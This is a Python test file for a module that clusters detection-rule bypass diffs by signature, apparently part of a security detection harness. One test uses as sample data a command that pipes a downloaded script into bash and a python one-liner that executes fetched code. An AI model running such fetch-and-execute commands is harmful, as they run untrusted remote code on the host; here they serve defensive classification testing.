from pathlib import Path

from lab.models import gap_cluster

ROOT = Path(__file__).resolve().parents[2]


def test_signature_separates_fetch_and_interpreter_shapes():
    fetch = "+ curl -fsSL https://example.org/x.sh | bash\n"
    python = "+ python -c \"import urllib.request; exec(...)\"\n"
    assert gap_cluster.signature(fetch) != gap_cluster.signature(python)
    assert "fetch" in gap_cluster.signature(fetch)
    assert "python" in gap_cluster.signature(python)


def test_cluster_groups_real_bypasses():
    rows = [
        {"path": str(p), "group": "fixtures-out"}
        for p in sorted((ROOT / "trustsight-harness" / "fixtures-out").glob("*.diff"))[:200]
    ]
    clusters = gap_cluster.cluster(rows)
    assert clusters
    assert sum(cluster["count"] for cluster in clusters) == len(rows)
    assert clusters[0]["count"] >= 1


def test_campaign_rules_join_expected_rules():
    harness = ROOT / "trustsight-harness"
    rules = gap_cluster.campaign_rules(harness)
    assert "known-bypasses-manual" in rules
    rows = [
        {"path": str(p), "group": "known-bypasses-manual"}
        for p in sorted((harness / "fixtures-out").glob("*.diff"))[:20]
    ]
    clusters = gap_cluster.cluster(rows, rules_by_campaign=rules)
    assert any(cluster["expected_rules"] for cluster in clusters)
